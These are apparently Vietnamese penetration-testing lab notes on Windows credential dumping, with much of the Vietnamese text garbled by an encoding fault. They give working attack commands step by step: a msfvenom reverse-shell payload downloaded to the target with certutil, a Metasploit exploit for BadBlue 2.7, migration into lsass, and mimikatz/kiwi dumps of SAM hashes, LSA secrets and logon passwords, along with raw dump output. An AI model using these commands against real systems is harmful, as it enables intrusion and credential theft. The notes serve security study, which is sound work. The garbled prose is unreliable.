# Windows Credential Dumping

Cáº§n cÃ³ phiÃªn nÃ¢ng cao Ä‘á»ƒ thu tháº­p Hash, vÃ¬ váº­y cáº§n leo thang Ä‘áº·c quyá»n trÆ°á»›c khi Ä‘i vÃ o pháº§n nÃ y 

## Windows Password Hashes

Windows lÆ°u trá»¯ cÃ¡c bÄƒm password user á»Ÿ SAM (Security Accounts Manager) database

Windows cÃ³ 2 loáº¡i bÄƒm:

- LM -> ko cÃ²n tháº¥y nhiá»u ná»¯a vÃ¬ cháº¡y á»Ÿ windows cÅ© (vista,..)
- NTLM

## LM (LanMan)

LM lÃ  thuáº­t toÃ¡n bÄƒm máº·c Ä‘á»‹nh Ä‘Ã£ Ä‘Æ°á»£c triá»ƒn khanh trÃªn windows cháº¡y kernel trÆ°á»›c NT 4.0

QÃºa trÃ¬nh bÄƒm:

- Pass Ä‘Æ°á»£c chia thÃ nh 2 pháº§n 7 kÃ­ tá»± 

- CÃ¡c kÃ­ tá»± Ä‘Æ°á»£c upcase viáº¿t hoa (vÃ¬ váº­y náº¿u máº­t kháº©u cÃ³ chá»¯ hoa vÃ  chá»¯ thÆ°á»ng thÃ¬ Ä‘á»u ko khÃ¡c gÃ¬ nhau vÃ¬ Ä‘á»u pháº£i lÃªn chá»¯ hoa)

- má»—i pháº§n sau Ä‘Ã³ Ä‘Æ°á»£c hash riÃªng biá»‡t báº±ng DES 

=> LM hash lÃ  phÆ°Æ¡ng thá»©c yáº¿u vÃ  dá»… dÃ ng báº» khÃ³a 

![alt text](image-2.png)


## NTLM (NTHash)

lÃ  giao thá»©c xÃ¡c thá»±c Ä‘Æ°á»£c sá»­ dá»¥ng giá»¯a cÃ¡c mÃ¡y tÃ­nh, bao gá»“m password vÃ  username

NTLM cáº£i thiá»‡n so vá»›i LM:

- KhÃ´ng chia lÃ m 2 khá»‘i

- phÃ¢n biá»‡t chá»¯ hoa chá»¯ thÆ°á»ng

- cho phÃ©p sá»­ dá»¥ng cÃ¡c kÃ­ tá»± Ä‘áº·c bieejt

![alt text](image-3.png)


## TÃ¬m kiáº¿m Password trong Windows Configurations Files

Kali Machine:

táº¡o `meterpreter` x64 payload

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.4.2 LPORT=1234 -f exe > payload.exe`

Táº¡o 1 server Ä‘á»ƒ Ä‘áº©y payload lÃªn:

`python -m SimpleHTTPServer 80`

VÃ o Target machine:

`cd Desktop`

Download the payload file

`certutil -urlcache -f http://10.10.4.2/payload.exe payload.exe`

Trá»Ÿ vá» Kali machine:

Má»Ÿ MSF:

`use multi/handler`

`set payload windows/x64/meterpreter/reverse_tcp`

`set LPORT 1234`

`set LHOST 10.10.4.2`

`run`

-> táº¡o ra port nghe, vÃ o Target machine Ä‘á»ƒ cháº¡y payload `payload.exe` vá»«a táº£i vá», ta sáº½ cÃ³ Ä‘Æ°á»£c reverse shell

trá»Ÿ láº¡i Kali machine

`sysinfo` 

BÃ¢y giá» ta sáº½ tÃ¬m file `unattend.xml` hoáº·c `autounattend.xml`

`search -f unattend.xml`

Hoáº·c tÃ¬m tay:

`cd C:\\`

`cd Windows`

`cd Panther`

`dir`

`download unattend.xml`

Má»Ÿ 1 cmd tab khÃ¡c:

`cat unattend.xml`

![alt text](image-4.png)

`administrator` user configured base64 password is `QWRtaW5AMTIz`

decode base64 `QWRtaW5AMTIz` ta Ä‘Æ°á»£c password: `Admin@123`

Test the `administrator:Admin@123root` credentials with the psexec tool

`psexec.py administrator@10.4.19.9` -> nháº­p password

`whoami` -> Ä‘Ã£ leo quyá»n cao nháº¥t

## Dumping hashes with Mimikatz

### Lab

TrÃªn kali cá»§a attacker:

`nmap 10.2.29.32`

tráº£ vá» cÃ³ port 80

`nmap -sV -p 80 10.2.29.32`

80/tcp open  http    BadBlue httpd 2.7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

ThÃ´ng tin mÃ¡y chá»§ vÃ  phiÃªn báº£n

ğŸ“Œ Exploit BadBlue 2.7 with metasploit

`msfconsole -q`

`search badblue`

`use exploit/windows/http/badblue_passthru`

`set RHOSTS 10.2.29.32`

`run`

Sau khi cháº¡y ta sáº½ cÃ³ phiÃªn vÃ o Ä‘Æ°á»£c mÃ¡y chá»§

`sysinfo`

`getuid` 

`pgrep lsass` -> láº¥y PID cá»§a `lsass.exe`

`migrate <PID>`

`getuid` -> Ä‘Ã£ lÃªn SYSTEM

`load kiwi` ->load extension cá»§a msf

`help`

`creds_all` -> láº¥y táº¥t cáº£ creds

Dump LSA SAM (NTLM hashes for all users)

`lsa_dump_sam`

![alt text](image-5.png)

`lsa_dump_secrets`

```bash
[+] Running as SYSTEM
[*] Dumping LSA secrets
Domain : ATTACKDEFENSE
SysKey : 377af0de68bdc918d22c57a263d38326

Local name : ATTACKDEFENSE ( S-1-5-21-3688751335-3073641799-161370460 )
Domain name : WORKGROUP

Policy subsystem is : 1.18
LSA Key(s) : 1, default {47980b9c-8bd1-89c9-bfb5-0c4fca25e625}
  [00] {47980b9c-8bd1-89c9-bfb5-0c4fca25e625} 247e7be223db5e50291fc0fcec276ff8236c32a8a6183c5a0d0b6b044590ce06

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 34 5e 65 80 f9 04 a4 8c a5 0e 6c 74 6c d2 c3 b8 8e 7a ca c3 a3 3b 0e 6e 0a 64 f3 12 fc c7 92 67 a3 2f d5 d1 e4 41 33 ac 
    full: 345e6580f904a48ca50e6c746cd2c3b88e7acac3a33b0e6e0a64f312fcc79267a32fd5d1e44133ac
    m/u : 345e6580f904a48ca50e6c746cd2c3b88e7acac3 / a33b0e6e0a64f312fcc79267a32fd5d1e44133ac
old/hex : 01 00 00 00 c1 3a 28 e3 94 7b 64 5d 94 29 b4 c9 1c 9b 0c b1 b6 5a aa 2c 34 4d ee ed 86 74 0f 12 25 37 8c 38 69 b3 b4 53 b6 37 86 44 
    full: c13a28e3947b645d9429b4c91c9b0cb1b65aaa2c344deeed86740f1225378c3869b3b453b6378644
    m/u : c13a28e3947b645d9429b4c91c9b0cb1b65aaa2c / 344deeed86740f1225378c3869b3b453b6378644

Secret  : NL$KM
cur/hex : 8d d2 8e 67 54 58 89 b1 c9 53 b9 5b 46 a2 b3 66 d4 3b 95 80 92 7d 67 78 b7 1d f9 2d a5 55 b7 a3 61 aa 4d 86 95 85 43 86 e3 12 9e c4 91 cf 9a 5b d8 bb 0d ae fa d3 41 e0 d8 66 3d 19 75 a2 d1 b2 
old/hex : 8d d2 8e 67 54 58 89 b1 c9 53 b9 5b 46 a2 b3 66 d4 3b 95 80 92 7d 67 78 b7 1d f9 2d a5 55 b7 a3 61 aa 4d 86 95 85 43 86 e3 12 9e c4 91 cf 9a 5b d8 bb 0d ae fa d3 41 e0 d8 66 3d 19 75 a2 d1 b2
```

=> KhÃ´ng cung cáº¥p Ä‘Æ°á»£c thÃ´ng tin gÃ¬ 

`cd C:\\`

`mkdir Temp`

`cd Temp`

`upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe` -> táº£i payload lÃªn target

`shell` -> vÃ o shell cá»§a mÃ¡y target

`.\mimikatz.exe` -> cháº¡y mimikatz

-> sáº½ vÃ o console cá»§a mimikatz

`mimikatz# privilege::debug`

Dump the cache of the `lsass` process

`lsadump::sam`

![alt text](image-6.png)

`lsadump::secrets`

![alt text](image-7.png)

`sekurlsa::logonPasswords` -> náº¿u login password, cháº¿ Ä‘á»™ lÆ°u plain text Ä‘Æ°á»£c báº­t, nháº­p cÃ¢u lá»‡nh nÃ y sáº½ xem Ä‘Æ°á»£c pass (cÃ²n password: null thÃ¬ khÃ´ng báº­t)

![alt text](image-8.png)


## Pass-The-hash attack

ChÃºng ta Ä‘Ã£ tÃ¬m cÃ¡ch láº¥y HASH nhÆ° trÃªn, vÃ  ta sáº½ tÃ¬m cÃ¡ch táº¥n cÃ´ng tá»« Hash Ä‘Ã³ 

Tools: Metasploit PsExec module, Crackmapexec









